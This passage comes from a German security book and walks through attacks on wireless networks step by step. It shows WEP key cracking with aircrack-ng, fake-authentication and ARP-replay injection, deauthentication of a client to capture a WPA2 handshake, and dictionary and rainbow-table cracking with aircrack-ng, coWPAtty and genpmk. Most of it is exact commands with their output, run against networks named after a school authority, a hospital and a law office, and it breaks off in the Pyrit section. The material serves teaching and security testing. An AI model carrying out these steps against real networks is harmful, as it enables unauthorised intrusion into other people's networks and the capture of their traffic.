00:14:6C:1D:1C:C2 schulbehoerde.dump01.cap\nAn dieser Stelle scheiden sich \u00fcbrigens die Geister, wie viele verwertbare Pakete f\u00fcr die Berechnung eines WEP-Schl\u00fcssels erforderlich sind: Die Autoren von Aircrack-NG empfehlen in der FAQ149 das Mitschneiden von 1.500.000 bis 2.000.000 Initialisierungsvektoren (IVs) f\u00fcr das problemlose Brechen eines mit 104/128 Bit verschl\u00fcsselten WLAN mittels der Korek-Methode, die PTW-Technik gibt sich bereits mit 40.000 Paketen zufrieden. Diverse Versuche zeigen jedoch, dass die Berechnung mit weniger Initialisierungsvektoren durchaus von Erfolg gekr\u00f6nt sein kann, auch wenn dabei vielleicht eine Portion Gl\u00fcck im Spiel sein muss. Grunds\u00e4tzlich empfehlen wir, so viel Funknetzverkehr wie m\u00f6glich zu erhaschen, obschon sich Aircrack-NG in der Grundeinstellung der effizienteren PTW-Technik bedient.\nBild 16.44: Aircrack-NG bei der Berechnung eines WEP-Schl\u00fcssels\n149\nhttp://www.aircrack-ng.org/doku.php?id=faq\n308\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nIst die Suche erfolgreich, zeigt sich Aircrack-NG (in diesem Beispiel bereits nach nur einer Sekunde(!)) mit einem Bild wie dem folgenden und pr\u00e4sentiert den enttarnten WEP-Schl\u00fcssel in roten Lettern.\nBild 16.45: Aircrack-NG hat einen WEP-Schl\u00fcssel erfolgreich berechnet\nBingo! Der WEP-Schl\u00fcssel dieses WLAN lautet DA:5B:A6:B8:E1:3F:60:C4:6D:94:98:80:2A und das Szenario ist somit erfolgreich abgeschlossen. Zum \u00bbEinklinken\u00ab in das soeben eroberte, aber immer noch verschl\u00fcsselte WLAN sind \u2013 neben einer Deaktivierung des Monitor-Mode \u2013 folgende Kommandos anzuwenden: root@discordia:~# root@discordia:~# root@discordia:~# root@discordia:~# root@discordia:~#\niwconfig iwconfig iwconfig ifconfig\nwlan0 wlan0 wlan0 wlan0\nmode managed essid SCHULBEHOERDE key DA5BA6B8E13F60C46D9498802A up\nDer Befehl iwconfig belegt die erfolgreiche Kopplung an den Hot-Spot: root@discordia:~# iwconfig wlan0 wlan0 IEEE 802.11abgn ESSID:\"SCHULBEHOERDE\" Mode:Managed Frequency:2.417 GHz Access Point: 00:14:6C:1D:1C:C2 Bit Rate=54 Mb/s Tx-Power=15 dBm Retry min limit:7 RTS thr:off Fragment thr=2352 B Encryption key:DA5B-A6B8-E13F-60C4-6D94-9880-2A Security mode:open Power Management:off Link Quality=70/100 Signal level:-64 dBm Noise level=-92 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:0 Missed beacon:0 root@discordia:~#\n16.3 Angriffe auf Funknetze\n309\nMit dem Befehl dhclient erfragt der Client eine IP-Adresse, ifconfig zeigt die vom DHCPServer erhaltene IP-Adresse und ein abschlie\u00dfendes ping belegt den Zugriff auf das Internet: root@discordia:~# dhclient wlan0 Internet Systems Consortium DHCP Client V3.1.1 Copyright 2004-2008 Internet Systems Consortium. All rights reserved. For info, please visit http://www.isc.org/sw/dhcp/ Listening on LPF/wlan0/00:21:5c:54:7d:cd Sending on LPF/wlan0/00:21:5c:54:7d:cd Sending on Socket/fallback DHCPDISCOVER on wlan0 to 255.255.255.255 port 67 interval 7 DHCPOFFER of 192.168.3.199 from 192.168.3.1 DHCPREQUEST of 192.168.3.199 on wlan0 to 255.255.255.255 port 67 DHCPACK of 192.168.3.199 from 192.168.3.1 bound to 192.168.3.199 -- renewal in 1452 seconds. root@discordia:~# ifconfig wlan0 wlan0 Link encap:Ethernet HWaddr 00:21:5c:54:7d:cd inet addr:192.168.3.199 Bcast:192.168.3.255 Mask:255.255.255.0 inet6 addr: fe80::221:5cff:fe54:7dcd/64 Scope:Link UP BROADCAST RUNNING PROMISC MULTICAST MTU:1500 Metric:1 RX packets:11739 errors:0 dropped:0 overruns:0 frame:0 TX packets:8 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:17367769 (17.3 MB) TX bytes:1296 (1.2 KB) root@discordia:~# ping www.heise.de PING www.heise.de (193.99.144.85) 56(84) bytes of data. 64 bytes from www.heise.de (193.99.144.85): icmp_seq=1 ttl=247 time=50.6 ms 64 bytes from www.heise.de (193.99.144.85): icmp_seq=2 ttl=247 time=322 ms ^C --- www.heise.de ping statistics --2 packets transmitted, 2 received, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 50.642/186.536/322.430/135.894 ms root@discordia:\nWas aber sollen wir unternehmen, wenn das WLAN nur ansatzweise Traffic liefert, wie beispielsweise das durch Kismet-Newcore aufgesp\u00fcrte WLAN mit der ESSID \u00bbSTADTKRANKENHAUS\u00ab auf Kanal 11? Verzeichnen wir viel Aktivit\u00e4t im Funknetz, reicht ein 5-min\u00fctiges Mitschneiden des Datenverkehrs oftmals aus. F\u00fcr den Fall jedoch, dass das Netzwerk nicht hinreichend Daten f\u00fcr Airodump-NG liefert, erzeugt man k\u00fcnstlichen Traffic durch Einstreuen eigener Pakete. Damit lassen sich auch moderate Funknetze in rauschende Datenfl\u00fcsse verwandeln. Zu diesem Zweck greifen wir auf die Injektionsfunktionalit\u00e4t von Aireplay-\n310\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nNG zur\u00fcck mit dem Ziel, m\u00f6glichst viele Datenpakete des WLAN aufzufangen und anschlie\u00dfend zur\u00fcckzukatapultieren. Welche WLAN-Karte (samt Chipsatz) daf\u00fcr grunds\u00e4tzlich in Frage kommt, wird auf der Website von Aircrack-NG unter Compatibility150 beschrieben. Die von den Autoren eingesetzten WLAN-Karten Proxim 8471-WD Orinoco und die Centrino a/g/n (Intel 4965AGN) des ThinkPad T61 werden voll unterst\u00fctzt, erfordern jedoch ein klein wenig Handarbeit beim Patchen der Treiber. Der Vollst\u00e4ndigkeit halber begeben wir uns in die Ausgangsposition zur\u00fcck, verwenden f\u00fcr das folgende Szenario ausschlie\u00dflich Bestandteile der Aircrack-NG-Suite und verzichten damit bewusst auf die bereits gewonnenen Informationen durch KismetNewcore. Zun\u00e4chst schalten wir unsere WLAN-Karte wie gehabt in den Monitoring-Mode und beginnen alsdann durch Airodump-NG mit einer Sichtung der sich in Reichweite befindlichen Hot-Spots: root@discordia:~# airmon-ng start wlan1\nInterface\nChipset\nDriver\nwlan0 wlan1\nIntel 4965/5xxx iwlagn \u2013 [phy0] Atheros ath5k \u2013 [phy1] (monitor mode enabled on mon0)\nroot@discordia:~# airodump-ng mon0\nBild 16.46: Airodump-NG beim Scanning nach Access-Points\n150\nhttp://www.aircrack-ng.org/doku.php?id=compatibility_drivers#drivers\n16.3 Angriffe auf Funknetze\n311\nDer \u00dcbersicht von Airodump-NG l\u00e4sst sich entnehmen, dass der von uns favorisierte Access-Point mit der ESSID \u00bbSTADTKRANKENHAUS\u00ab die BSSID 00:22:6B:70:1E:FE innehat, auf Kanal 11 betrieben wird und zum aktuellen Zeitpunkt einen WLAN-Client beherbergt. Mit dieser Erkenntnis im Hinterkopf deaktivieren wir den Monitoring-Mode von mon0. Im Anschluss daran f\u00fchren wir erneut den Monitoring-Mode f\u00fcr wlan1 herbei \u2013 diesmal jedoch in Form einer Fixierung auf Kanal 11 \u2013 und beauftragen anschlie\u00dfend Airodump-NG mit der Speicherung s\u00e4mtlicher auf Kanal 11 \u00fcbertragenen Pakete von der BSSID 00:22:6B:70:1E:FE in ein Dump-File: root@discordia:~# airmon-ng stop mon0\nInterface\nChipset\nDriver\nwlan0 wlan1 mon0\nIntel 4965/5xxx iwlagn \u2013 [phy0] Atheros ath5k \u2013 [phy1] Atheros ath5k \u2013 [phy1] (removed)\nroot@discordia:~# airmon-ng start wlan1 11\nInterface\nChipset\nDriver\nwlan0 wlan1\nIntel 4965/5xxx iwlagn \u2013 [phy0] Atheros ath5k \u2013 [phy1] (monitor mode enabled on mon0)\nroot@discordia:~# airodump-ng -c 11 --bssid 00:22:6B:70:1E:FE -w spital.dump mon0\nAirodump-NG wird hierdurch angewiesen, s\u00e4mtliche Pakete des auf Kanal 11 funkenden Access-Points mit der BSSID 00:22:6B:70:1E:FE aufzufangen und in ein Dumpfile zu schreiben.\n312\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.47: Airodump-NG mit Fokus auf die BSSID 00:22:6B:70:1E:FE auf Kanal 11\nIst sichergestellt, dass Airodump-NG einen permanenten Datenstrom des Funknetzverkehrs aufzeichnet, starten wir mit Aireplay-NG die Fake-Authentication-Attacke: root@discordia:~# aireplay-ng -1 0 -e STADTKRANKENHAUS -a 00:22:6B:70:1E:FE mon0 No source MAC (-h) specified. Using the device MAC (00:20:A6:4C:B3:52) 13:31:38 Waiting for beacon frame (BSSID: 00:22:6B:70:1E:FE) on channel 11 13:31:38 Sending Authentication Request (Open System) [ACK] 13:31:38 Authentication successful 13:31:38 Sending Association Request [ACK] 13:31:38 Association successful :-) (AID: 1) root@discordia:~#\nBeim Parameter --fakeauth 0 handelt es sich um den Attack-Mode ohne Verz\u00f6gerung (Verz\u00f6gerungseinheit von 0), bei -e um die ESSID des Ziel-Hot-Spots \u00bbSTADTKRANKENHAUS\u00ab und mit -a wird die MAC-Adresse des zu t\u00e4uschenden HotSpots gesetzt (00:22:6B:70:1E:FE). Verl\u00e4uft die Injektion erfolgreich, meldet sich das Programm mit \u00bbAssociation successful\u00ab zur\u00fcck, und wir k\u00f6nnen zum n\u00e4chsten Schritt \u00fcbergehen.\n16.3 Angriffe auf Funknetze\n313\nBild 16.48: Aireplay-NG bei der Kontaktaufnahme mit dem fremden Access-Point\nScheitert das Vorhaben jedoch, k\u00f6nnen folgende Faktoren daf\u00fcr verantwortlich sein: \u2022\nESSID und BSSID sind nicht korrekt\n\u2022\nDer Hot-Spot filtert MAC-Adressen (und reagiert damit auf keine Anfragen unserer Karte)\n\u2022\nChipsatz und Treiber unserer WLAN-Karte werden von Aireplay-NG nicht unterst\u00fctzt, bzw. wurden nicht gepatcht\nVerl\u00e4uft die Fake-Authentication-Attacke auch bei einem weiteren Hot-Spot erfolglos \u2013 und sind alle Parameter erneut \u00fcberpr\u00fcft worden \u2013, sollten wir die grunds\u00e4tzliche Eignung der WLAN-Karte kl\u00e4ren. Um der Frage nachzugehen, ob unsere WLAN-Karte Paket-Injection unterst\u00fctzt, bedarf es folgender Eingabe: root@discordia:~# aireplay-ng -11 -e STADTKRANKENHAUS -a 00:22:6B:70:1E:FE mon0 20:28:35 20:28:35 20:28:35 20:28:37\nWaiting for beacon frame (BSSID: 00:22:6B:70:1E:FE) on channel 11 Trying broadcast probe requests... Injection is working! Found 1 AP\n20:28:37 20:28:37 20:28:39 20:28:39\nTrying directed probe requests... 00:22:6B:70:1E:FE \u2013 channel: 11 \u2013 'STADTKRANKENHAUS' Ping (min/avg/max): 1.834ms/68.167ms/111.720ms Power: 33.71 30/30: 100%\nBei dem Parameter -11 handelt es sich um den Kanal, -e gibt die ESSID vor,\u2013a definiert die BSSID des Access-Points und mon0 ist unsere in den Monitoring-Mode geschaltete WLAN-Karte.\n314\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nErhalten wir wenige Sekunden sp\u00e4ter einen Wert von \u00bb0\u00ab, m\u00fcssen wir uns wohl oder \u00fcbel damit abfinden, dass die Karte keine Injektion unterst\u00fctzt. In diesem Fall bietet sich der Kauf einer anderen Karte an oder aber der Verzicht auf aktive Attacken. Gelingt die Injektion, fahren wir mit der \u00bbARP-Request-Reinjection\u00ab fort. Wir sind dadurch in der Lage, das Auffangen von Initialisierungsvektoren um ein Vielfaches zu beschleunigen. F\u00fcr die Replay-Attacke verwenden wir folgendes Kommando: root@discordia:~# aireplay-ng -3 -b 00:22:6B:70:1E:FE mon0\nBei dem Parameter -3 f\u00fcr \u00bbarpreplay\u00ab handelt es sich um den Attack-Mode, bei -b um die MAC-Adresse des Ziel-Hot-Spots und bei mon0 handelt es sich wieder um unsere WLAN-Karte. In der Regel dauert es ein paar Minuten, bevor das erste ARP-Paket aufgenommen und zur\u00fcckgespielt wird. Verl\u00e4uft der Angriff erfolgreich, kann sich der Funknetzforscher binnen weniger Minuten \u00fcber einen steilen Anstieg des WLAN-Traffics freuen (vgl. Abb. 16.49 und 16.50).\nBild 16.49: Aireplay-NG bei einer ARP-Request-Reinjection\n16.3 Angriffe auf Funknetze\n315\nBild 16.50: Airodump-NG verzeichnet eine hohe Netzlast und empf\u00e4ngt zahlreiche Pakete\nDie anschlie\u00dfende Berechnung des WEP-Schl\u00fcssels stellt f\u00fcr Aircrack-NG bei einer derart hohen Datenlast keine Herausforderung mehr dar: root@discordia:~# aircrack-ng -b 00:22:6B:70:1E:FE spital.dump-01.cap\nBild 16.51: Aircrack-NG liefert binnen k\u00fcrzester Zeit den WEP-Schl\u00fcssel\nEin Hinweis am Rande: Die Programme Airodump-NG, Aireplay-NG und Aircrack-NG sollten parallel betrieben werden, entfalten sie doch dabei eine \u00e4u\u00dferst effiziente Vorgehensweise. So erh\u00e4lt beispielsweise Aircrack-NG immer neues, anwachsendes Material von Airodump-NG, welches unmittelbar in die Berechnung eingebunden wird. Es gibt noch weitere M\u00f6glichkeiten, in einem WLAN mit Aireplay-NG k\u00fcnstliche Netzlast zu erzeugen (so beispielsweise durch das Einspielen von ARP-Replays), die ARP-\n316\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nRequest-Reinjection stellt unserer Auffassung nach jedoch die angenehmste Methode dar. Wir halten abschlie\u00dfend fest, dass ein Funknetz, in dem viel Datenverkehr herrscht, f\u00fcr den erfolgreichen Angriff auf eine WEP-Verschl\u00fcsselung vorteilhaft ist. F\u00fcr alle anderen F\u00e4lle steht uns mit Aireplay-NG ein h\u00f6chst effektives Werkzeug zur Seite. F\u00fcr angehende Netzwerkforscher, die kein Interesse an Handarbeit versp\u00fcren, m\u00f6gen die Tools SpoonWep aus der Linux-basierten Security-Suite BackTrack 3151, Airoscript152 oder Wesside-NG153 eine Wohltat darstellen. Den Werkzeugen ist gemein, dass sie die soeben vorgestellten Schritte weitestgehend automatisiert durchf\u00fchren.\nBild 16.52: SpoonWep beim Brechen eines WEP-Schl\u00fcssels\n16.3.6 Zugriff auf ein WPA2-verschl\u00fcsseltes WLAN W\u00e4hrend wir in der Erstausgabe dieses Buches vor drei Jahren bei der Demonstration des Brechens einer WPA/WPA2-Verschl\u00fcsselung noch von einem \u00bbkonstruierten Szenario\u00ab sprachen, handelt es sich mittlerweile um eine ernst zu nehmende Bedrohung. So gilt die Verschl\u00fcsselungsmethode WPA2 (Wi-Fi Protected Access) zwar auch weiterhin als ungebrochen, eine Kombination aus neuartigen Angriffen, unbedarften WLANBetreibern und die zur Verf\u00fcgung stehende Rechenpower stellen jedoch eine explosive Mischung dar. Hinzu kommt, dass findige Cloud-Anbieter wie die US-Firma WPA\n151\nhttp://www.backtrack-linux.org/downloads\n152\nhttp://airoscript.aircrack-ng.org\n153\nhttp://www.aircrack-ng.org/doku.php?id=wesside-ng\n16.3 Angriffe auf Funknetze\n317\nCracker154 das Knacken eines WPA-Schl\u00fcssels mit einer Rechnerfarm auch f\u00fcr schmales Budget erm\u00f6glichen, der Besitz eines eigenen Rechenzentrums somit nicht zwangsl\u00e4ufig erforderlich ist. Bevor m\u00f6gliche Missverst\u00e4ndnisse entstehen, m\u00f6chten die Autoren vorsorglich darauf hinweisen, dass WPA2 auch weiterhin unsere Minimalempfehlung zur Sicherung eines WLAN im Heimbereich darstellt, zumal die Unzul\u00e4nglichkeit recht \u00fcberschaubar ist. Im Gegensatz zu der evidenten Schw\u00e4che155 von WEP (und anteilig auch WPA-TKIP), bei der durch die Einbindung statistischer Methoden der WEP-Schl\u00fcssel schnell gebrochen werden kann, greifen bei WPA2 derzeit nur zeit- als auch rechenintensive Brute-ForceTechniken. Der W\u00f6rterbuchangriff, den wir gleich demonstrieren, kann immer dann erfolgreich sein, wenn der Funknetzbetreiber eine unsichere Passphrase f\u00fcr den WPA2-Schl\u00fcssel verwendet, beispielsweise in Form eines trivialen Begriffs, wie es ihn auch in einem W\u00f6rterbuch gibt. F\u00fcr dieses Szenario begeben wir uns mit Airodump-NG auf die Suche nach Funknetzen in der Umgebung, schalten daf\u00fcr im Vorfeld unsere WLAN-Karte durch Airmon-NG in den Monitoring-Mode und entdecken im Hot-Spot KANZLEI_BERGER einen potenziellen, mit WPA2-verschl\u00fcsselten Kandidaten. root@discordia:~# airmon-ng start wlan0 root@discordia:~# airodump-ng mon0\nBild 16.53: Hot-Spot \u00bbKANZLEI_BERGER\u00ab verwendet eine WPA2-Verschl\u00fcsselung auf Kanal 6\n154\nhttp://www.wpacracker.com\n155\nhttp://dl.aircrack-ng.org/breakingwepandwpa.pdf\n318\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nMit diesem klaren Ziel vor Augen und der Gewissheit, dass sich ein Client im favorisierten WLAN befindet, stoppen wir kurz den Monitoring-Mode, um diesen anschlie\u00dfend \u2013 diesmal fixiert auf Kanal 6 \u2013 erneut zu starten. root@discordia:~# airmon-ng stop mon0\nInterface\nChipset\nDriver\nwlan0 mon0\nIntel 4965/5xxx iwlagn \u2013 [phy0] Intel 4965/5xxx iwlagn \u2013 [phy0] (removed)\nroot@discordia:~# airmon-ng start wlan0 6\nInterface\nChipset\nDriver\nwlan0\nIntel 4965/5xxx iwlagn \u2013 [phy0] (monitor mode enabled on mon0)\nroot@discordia:~#\nZum Mitschneiden der Datenpakete greifen wir zu Airodump-NG und hoffen, einen 4Wege-Handshake zu erhaschen (vgl. Abb. 16.54). Verzeichnen wir Aktivit\u00e4t im WLAN, l\u00e4sst sich ein 4-Way-Handshake recht schnell mitschneiden. Herrscht jedoch g\u00e4hnende Leere, ist Geduld gefragt; zumindest so lange, bis sich ein WLAN-Client einfindet. In der Notwendigkeit von WPA-Handshakes liegt n\u00e4mlich einer der entscheidenden Unterschiede zur bereits demonstrierten Berechnung eines WEP-Schl\u00fcssels: Da es bei WPA2 derzeit keine M\u00f6glichkeit eines ernst zu nehmenden effektiven Angriffs gibt, z. B. bedingt durch eine Designschw\u00e4che der Verschl\u00fcsselung, sind Handshakes, also der Anund Abmeldeprozess von WLAN-Clients, Grundvoraussetzung f\u00fcr unser Vorhaben. Wir ben\u00f6tigen mindestens einen qualifizierten 4-Way-Handshake, um einem W\u00f6rterbuchangriff den Hauch einer Chance zu geben. root@discordia:~# airodump-ng -c 6 --bssid 00:14:6C:1D:1C:C -w berger_wpa.dump mon0\n16.3 Angriffe auf Funknetze\n319\nBild 16.54: Airodump-NG bei der Sammlung von Datenpaketen auf Kanal 6\nDer folgende Schritt mit Aireplay-NG ist optional, bietet sich jedoch immer dann an, wenn auch nach l\u00e4ngerer Zeit keine 4-Way-Handshakes aufgefangen werden konnten. Zwingend erforderlich hierf\u00fcr ist, dass ein WPA2-Client mit dem Hot-Spot verbunden ist, den wir kurzfristig \u00bbherauskegeln\u00ab und somit zur Reauthentication zwingen k\u00f6nnen. Durch die Reauthentication des Clients wird ein 4-Way-Handshake generiert \u2013 genau das, was wir ben\u00f6tigen. Nachdem wir durch Airodump-NG sowohl die BSSID des Hot-Spots (00:14:6C:1D:1C: C2) als auch die MAC-Adresse eines offiziell dort eingebuchten WLAN-Clients erfahren haben (00:24:2B:2E:52:C8), starten wir die Deauthenticate-Attacke: root@discordia:~# aireplay-ng -0 5 -a 00:14:6C:1D:1C:C2 -c 00:24:2B:2E:52:C8 21:28:38 Waiting 21:28:38 Sending ACKs] 21:28:39 Sending ACKs] 21:28:39 Sending ACKs] 21:28:40 Sending ACKs] 21:28:41 Sending ACKs] root@discordia:~#\nmon0 for beacon frame (BSSID: 00:14:6C:1D:1C:C2) on channel 6 64 directed DeAuth. STMAC: [00:24:2B:2E:52:C8] [ 2|64 64 directed DeAuth. STMAC: [00:24:2B:2E:52:C8] [ 0|62 64 directed DeAuth. STMAC: [00:24:2B:2E:52:C8] [ 6|64 64 directed DeAuth. STMAC: [00:24:2B:2E:52:C8] [17|63 64 directed DeAuth. STMAC: [00:24:2B:2E:52:C8] [ 3|64\nBingo, wir haben Gl\u00fcck! Unsere Deauthenticate-Attack f\u00fchrte zur Reauthentication des Clients, verbunden mit der Preisgabe des ben\u00f6tigten Handshakes (zu erkennen im folgenden Screenshot im rechten oberen Eck).\n320\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.55: Aireplay-NG hat durch Deauthentication ein 4-Way-Handshake wachk\u00fcssen k\u00f6nnen\nNachdem wir mindestens einen 4-Way-Handshake erfasst haben, bedienen wir uns des im vorherigen Szenario bereits vorgestellten Programms Aircrack-NG f\u00fcr einen W\u00f6rterbuchangriff. Daf\u00fcr ben\u00f6tigen wir eine m\u00f6glichst umfangreiche Passwortliste in Textform, da bei diesem Angriff jeder Eintrag als potenzielles Passwort durchprobiert wird. F\u00fcr unser Beispiel verwenden wir eine auf der Openwall wordlists collection156 basierende und um individuelle Eintr\u00e4ge angereicherte Passwortliste, die uns zu Demonstrationszwecken ausreicht. Weitere Wordlists (umfassendere, auch in verschiedenen Sprachen) finden sich auf diversen Web- und FTP-Sites157 im Internet. Bevor wir beginnen, ist es jedoch ratsam, die Passwortliste zu optimieren. Wir erinnern uns: Die Passphrase bei WPA/WPA2 umfasst einen Zeichenraum von 8 \u2013 63 Zeichen. Den Bereich zwischen 1 und 7 m\u00fcssen wir somit nicht ber\u00fccksichtigen, findet dieser doch gar keine Anwendung. Ein leistungsf\u00e4higes Tool zum Optimieren von Passwortlisten stellt PW-Inspector aus der Hydra-Suite dar. Um sicherzustellen, dass unsere Liste von Eintr\u00e4gen mit einer L\u00e4nge von 1 \u2013 7 Zeichen erleichtert wird, reicht der Befehl: root@discordia:~# cat all_lenghts.lst | pw-inspector -m 8 -M 63 > all_863_lenghts.lst\n156\nhttp://www.openwall.com/wordlists\n157\nW\u00f6rterb\u00fccher finden sich z. B. unter http://www.outpost9.com/files/WordLists.html ftp://ftp.ox.ac.uk/pub/wordlists http://www.packetstormsecurity.org/Crackers/wordlists\n16.3 Angriffe auf Funknetze\n321\nWo wir gerade beim Optimieren sind, kann eine alphabetische Sortierung mit sort nebst L\u00f6schung doppelter Eintr\u00e4ge nur von Vorteil sein: root@discordia:~# sort -u all_8-63_lenghts.lst > all.lst\nDerart verbessert, pr\u00e4sentiert sich unsere Passwortliste wie folgt: root@discordia:~# wc -l all.lst 2971651 all.lst root@discordia:# cat all.lst #!comment: #!comment: Input wordlist files, in order: #!comment: http://www.openwall.com/wordlists/ #!comment: languages/Afrikaans/lower.lst #!comment: languages/Afrikaans/mixed.lst #!comment: languages/Croatian/lower.lst #!comment: languages/Croatian/mixed.lst #!comment: languages/Czech/lower.lst (...) \u00c4nderungsantr\u00e4ge \u00c4nderungsantrag \u00c4nderungsgesetz \u00c4nderungsgesetze \u00c4nderungsindex \u00c4nderungsketten \u00c4nderungsrichtlinie (...)\nAlternativ dazu l\u00e4sst sich die Optimierung nat\u00fcrlich auch durch folgende einzelne Zeile vollziehen: root@discordia:~# cat all_lenghts.lst | sort | uniq | pw-inspector -m 8 -M 63 > all.lst\nF\u00fcr einen W\u00f6rterbuchangriff auf den WPA2-Datenstrom, den wir zuvor mit AirodumpNG erfasst hatten, verwenden wir nun folgendes Kommando: root@discordia:~# aircrack-ng -w all.lst -b 00:14:6C:1D:1C:C2 berger_wpa.dump-01.cap\nHat Aircrack-NG das korrekte Kennwort durch den W\u00f6rterbuchangriff entdeckt, erscheint folgende Meldung \u2013 f\u00fcr uns ein klares Signal, auch dieses Szenario erfolgreich durchlaufen zu haben:\n322\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nBild 16.56: Erfolgreicher W\u00f6rterbuchangriff mit Aircrack-NG auf eine WPA2-Verschl\u00fcsselung\nNeben dem Klassiker Aircrack-NG gibt es jedoch noch weitere Kandidaten, die WPA2 das Leben zunehmend schwer machen \u2013 coWPAtty ist einer davon. coWPAtty versteht sich neben Brute-Force- auch auf W\u00f6rterbuchangriffe und verwendet hierzu sowohl klassische Passwortlisten als auch Rainbow Tables. Rainbow Tables erm\u00f6glichen eine schnelle, probabilistische Suche nach dem einem Hash-Wert zugeordneten Klartext (wie beispielsweise einem Passwort), ohne zuvor alle f\u00fcr diesen Zeichenraum m\u00f6glichen Hashwerte aufwendig errechnen zu m\u00fcssen. Rainbow Tables lassen sich f\u00fcr WPA2 beispielsweise durch genpmk158 gewinnen und bedeuten somit f\u00fcr den eigentlichen W\u00f6rterbuchangriff eine nicht unerhebliche Zeitersparnis. Der Einsatz von coWPAtty gestaltet sich wie folgt, wobei der Parameter \u2013f auf unsere Passwortliste, -r auf das Dumpfile von Airodump-NG und \u2013s auf die ESSID des HotSpots verweist: root@discordia:~# cowpatty -f /wordlists/all.lst -r berger_wpa.dump-01.cap -s KANZLEI_BERGER cowpatty 4.6 \u2013 WPA-PSK dictionary attack.\n[[email protected]](/cdn-cgi/l/email-protection)\nCollected all necessary data to mount crack against WPA2/PSK passphrase. Starting dictionary attack. Please be patient. key no. 1000: AL-RASHID key no. 2000: Abbaugera\"usche key no. 3000: Abtritte key no. 4000: Aerzteverband key no. 5000: Albanorum\n158\nhttp://wirelessdefence.org/Contents/coWPAttyMain.htm\n16.3 Angriffe auf Funknetze\n323\nkey no. 6000: Altiplano key no. 7000: Anaptomorphus (...) key key key key\nno. no. no. no.\n1156000: 1157000: 1158000: 1159000:\nindispettiranno indkvarteringer indovinabile indsukret\nThe PSK is \"indubioproreo\". 1159422 passphrases tested in 13877.29 seconds: root@discordia:~#\n83.55 passphrases/second\nZum direkten Vergleich erfolgt die gleiche Berechnung durch eine Rainbow Table. Zun\u00e4chst jedoch m\u00fcssen wir die Hash-Werte gewinnen, wobei der Parameter \u2013f auf die Passwortliste verweist, -d die zu erstellende Hash-Datei vorgibt und \u2013s die ESSID des Hot-Spots beschreibt: root@discordia:~# root@discordia:~# genpmk -f /wordlists/all.lst -d /wordlists/all_rainbow.lst \u2013s KANZLEI_BERGER genpmk 1.1 \u2013 WPA-PSK precomputation attack.\n[[email protected]](/cdn-cgi/l/email-protection)\nFile /wordlists/all_rainbow.lst does not exist, creating. key no. 1000: AL-RASHID key no. 2000: Abbauger\u00e4usche key no. 3000: Abtritte key no. 4000: \u00c4rzteverband key no. 5000: Albanorum (...) key key key key key\nno. no. no. no. no.\n2967000: 2968000: 2969000: 2970000: 2971000:\nzzzzzzzthis zzzzzzzz zzzzzzzzzz zzzzzzzzzzzzz zzzzzzzzzzzzzzzzzz\n2971651 passphrases tested in 24642.56 seconds:\n120.59 passphrases/second\nroot@discordia:~#\nWer kein sonderliches Interesse an der Erstellung eigener Rainbow Tables versp\u00fcrt, findet im Internet zahlreiche Quellen, so beispielsweise die CoWF WPA-PSK Rainbow Tables159 mit \u00fcber 33 Gigabyte an Material.\n159\nhttp://www.renderlab.net/projects/WPA-tables\n324\nKapitel 16 \u2013 Szenario V: WLAN-Attacke\nDie eigentliche Berechnung mit coWPAtty unter Einbindung der Rainbow Table erfolgt durch folgendes Kommando: root@discordia:~# cowpatty -r berger_wpa.dump-01.cap -d /wordlists/all_rainbow.lst -s KANZLEI_BERGER cowpatty 4.6 \u2013 WPA-PSK dictionary attack.\n[[email protected]](/cdn-cgi/l/email-protection)\nCollected all necessary data to mount crack against WPA2/PSK passphrase. Starting dictionary attack. Please be patient. key no. 10000: Arbeitstakt key no. 20000: Bezugssystem key no. 30000: Chiclayo key no. 40000: Druckbelastung key no. 50000: Fallt\u00fcren key no. 60000: Gemeinschaftsinteresse (...) key key key key key key\nno. no. no. no. no. no.\n1100000: 1110000: 1120000: 1130000: 1140000: 1150000:\nhuggestabbe hyperaccelerated identifikacni imboccata impulsar incornarsi\nThe PSK is \"indubioproreo\". 1159422 passphrases tested in 11.28 seconds: root@discordia:~#\n102789.29 passphrases/second\nVoil\u00e0! Im Verh\u00e4ltnis zur Passwortliste erm\u00f6glicht uns die Rainbow Table bei der Berechnung eine massive Zeitersparnis und liefert \u00fcber diesen Weg grobe Einblicke in das Potenzial von Rainbow Tables. Der letzte im Bunde, der im Kontext des Brechens von WPA/WPA2 zwingend einer Erw\u00e4hnung bedarf, ist Pyrit. Pyrit verwendet CUDA (Compute Unified Device Architecture), ATI-Stream, OpenCL und VIA Padlock, was bedeutet, dass zus\u00e4tzlich zur CPU-Leistung die Grafikprozessoren (Graphics Processing Unit \u2013 GPU) eingebunden werden. Dank der mittlerweile \u00e4u\u00dferst potenten GPUs lassen sich Brute-Force-Attacken \u00e4hnlich z\u00fcgig durchf\u00fchren wie ein Angriff \u00fcber Rainbow Tables. Als zus\u00e4tzliches Bonbon entf\u00e4llt die zeitaufwendige und speicherintensive Generierung der Hash-Werte. Zudem gibt es handfeste monet\u00e4re Vorteile beim Einsatz von GPUs: W\u00e4hrend es in der j\u00fcngeren Vergangenheit recht kostenintensiv war, sich einen vor Rechenpower strotzenden \u00bbBoliden\u00ab zusammenzustellen \u2013 immerhin dreht sich die Preisspirale f\u00fcr CPUs oberhalb des Niveaus eines Intel CoreTM i7 Extreme sichtlich schneller \u2013, befinden sich leistungsf\u00e4hige Grafikkarten in bezahlbaren Dimensionen. So liegt im Benchmark die Performance zur Berechnung der PMKs (Pairwise Master Keys) bei einem PC mit\n16.3 Angriffe auf Funknetze\n325\nbeispielsweise vier in Reihe geschalteten GeForce 295 GTX-Karten bei etwa 89.000 PMKs, die eines normalen Core2Duo 2x2 mit 5 Ghz (x86) nur bei 1.300. Eine Leistungssteigerung um den Faktor 70! Die Bedienung von Pyrit erfolgt \u2013 nachdem sichergestellt ist, dass sowohl das Programm installiert, als auch die GPUs erfolgreich durch CUDA eingebunden wurden \u2013 durch drei Schritte. Zun\u00e4chst erstellen wir eine neue 